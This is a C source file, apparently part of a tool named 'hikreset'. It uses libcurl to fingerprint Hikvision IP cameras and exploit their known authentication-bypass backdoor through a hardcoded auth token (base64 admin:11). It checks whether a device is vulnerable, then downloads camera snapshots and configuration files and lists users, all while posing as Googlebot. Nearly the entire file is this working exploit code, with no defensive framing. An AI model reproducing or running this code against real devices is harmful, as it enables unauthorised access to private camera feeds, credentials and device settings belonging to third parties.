#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif
#include <curl/curl.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include "hikreset.h"


static size_t
WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp)
{
  size_t realsize = size * nmemb;
  struct MemoryStruct *mem = (struct MemoryStruct *)userp;
 
  char *ptr = realloc(mem->memory, mem->size + realsize + 1);
  if(!ptr) {
    /* out of memory! */
    printf("not enough memory (realloc returned NULL)\n");
    return 0;
  }
 
  mem->memory = ptr;
  memcpy(&(mem->memory[mem->size]), contents, realsize);
  mem->size += realsize;
  mem->memory[mem->size] = 0;
 
  return realsize;
}

static void
deleteNullBytes(char *p, size_t i){
	//i - size of str *p
	for(int k=0;k<=(int)(i-1);k++)
		if (p[k]=='\0')
			p[k]='0';
}

int hikvisionCheck(char *ip){
	///doc/page/login.asp?_
	CURL *curl;
	CURLcode res;
	curl = curl_easy_init();
	char* url;
	asprintf(&url,"%s/",ip);
	

	if(curl) {
		struct MemoryStruct chunk;
 
  		chunk.memory = malloc(1);  /* will be grown as needed by the realloc above */
  		chunk.size = 0;

  		curl_easy_setopt(curl, CURLOPT_SSL_VERIFYSTATUS, 0);
		curl_easy_setopt(curl, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);
		curl_easy_setopt(curl, CURLOPT_URL, url);
		curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
		curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Safari/537.36");
		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);
		curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);

		res = curl_easy_perform(curl);

		if(res != CURLE_OK){
			fprintf(stderr, "%s - curl_easy_perform() failed: %s\n",ip, 
				curl_easy_strerror(res));
			curl_easy_cleanup(curl);
			free(url);
			return EASYPERFORMERR;
		}

		curl_easy_cleanup(curl);
		free(url);
		char *p;
		p = (char *)realloc(chunk.memory, chunk.size+1);
		if (!p){
			fprintf(stderr, "Not enough memory!\n");
			return NOTENOUGHTMEMORY;
		}
		chunk.memory=p;
		chunk.size++;

		deleteNullBytes(chunk.memory, chunk.size);

		chunk.memory[chunk.size-1] = '\0';
		char *comp = strstr(chunk.memory, "doc/page/login.asp");
		free(chunk.memory);
		if (comp)
			return 1;
		else
			return NOTHIKVISIONERR;

	}else{
		return CURLINITERR;
	}
}

int backdoorCheck(char *ip){
	int hikvisionCheckResult = hikvisionCheck(ip);
	if(hikvisionCheckResult==1){
		CURL *curl;
		CURLcode res;
		curl = curl_easy_init();

		if(curl) {
			char* url;
			asprintf(&url,"%s/System/deviceInfo?auth=YWRtaW46MTEK",ip);
			FILE *black_hole = fopen("/dev/null", "wb");

			curl_easy_setopt(curl, CURLOPT_SSL_VERIFYSTATUS, 0);
			curl_easy_setopt(curl, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);
			curl_easy_setopt(curl, CURLOPT_URL, url);
			curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
			curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Safari/537.36");
			curl_easy_setopt(curl, CURLOPT_WRITEDATA, black_hole);

			res = curl_easy_perform(curl);

			if(res != CURLE_OK){
				fprintf(stderr, "%s - curl_easy_perform() failed: %s\n", ip,
					curl_easy_strerror(res));
				curl_easy_cleanup(curl);
				return EASYPERFORMERR;
			}
			long http_code = 0;

			curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);
			curl_easy_cleanup(curl);
			free(url);
			if(http_code == 200) return 1;
			else return NOTVULNERABLE;
		}
		else{
			return CURLINITERR;
		}
	}else return hikvisionCheckResult;

}

int download(char *ip, enum downloadFile filetype, FILE* fd){
	CURL *curl;
	CURLcode res;
	curl = curl_easy_init();
	char* url;
	int checked = backdoorCheck(ip);
	if (checked == 1){
		if (filetype==SNAPSHOT){
			asprintf(&url,"%s%s",ip,"/onvif-http/snapshot?auth=YWRtaW46MTEK");
		}
		else if (filetype==CONFIG){
			asprintf(&url,"%s%s",ip,"/System/configurationFile?auth=YWRtaW46MTEK");
		}
		else {
			return EINVAL;
		}
		if(curl) {
			
			curl_easy_setopt(curl, CURLOPT_SSL_VERIFYSTATUS, 0);
			curl_easy_setopt(curl, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);
			curl_easy_setopt(curl, CURLOPT_URL, url);
			curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
			curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Safari/537.36");
			curl_easy_setopt(curl, CURLOPT_WRITEDATA, fd);
			res = curl_easy_perform(curl);

			if(res != CURLE_OK){
				fprintf(stderr, "%s, curl_easy_perform() failed: %s\n",ip,
					curl_easy_strerror(res));
				return EASYPERFORMERR;
			}
			long http_code = 0;

			curl_easy_getinfo (curl, CURLINFO_RESPONSE_CODE, &http_code);
			curl_easy_cleanup(curl);
			free(url);

			return http_code;
		}
		else{
			return CURLINITERR;
		}
	}
	else if (checked == NOTENOUGHTMEMORY)
		fprintf(stderr, "%s - Not enough memory.",ip);
	else if (checked == NOTHIKVISIONERR)
		fprintf(stderr, "%s - Not a Hikvision device.",ip);
	else if (checked == CURLINITERR)
		fprintf(stderr, "%s - error while cURL init.",ip);
	return checked;
}

int getUsers(char *ip){
	int checked = backdoorCheck(ip);
	if(checked==1){
		CURL *curl;
		CURLcode res;
		curl = curl_easy_init();
		char* url;
		asprintf(&url,"%s/Security/users?auth=YWRtaW46MTEK",ip);
		
		if(curl) {
			curl_easy_setopt(curl, CURLOPT_URL, url);
			curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
			curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Safari/537.36");
			res = curl_easy_perform(curl);

			if(res != CURLE_OK){
				fprintf(stderr, "curl_easy_perform() failed: %s\n",
					curl_easy_strerror(res));
				return EASYPERFORMERR;
			}
			curl_easy_cleanup(curl);
			free(url);
		}
		else return CURLINITERR;
	}
	else if (checked == CURLINITERR)
		printf("Something went wrong during curl init.\n");
	else if (checked == NOTENOUGHTMEMORY)
		fprintf(stderr, "%s - Not enough memory.",ip);
	else if (checked == NOTHIKVISIONERR)
		fprintf(stderr, "%s - Not a Hikvision device.",ip);
	else if (checked == CURLINITERR)
		fprintf(stderr, "%s - error while cURL init.",ip);
	return checked;
}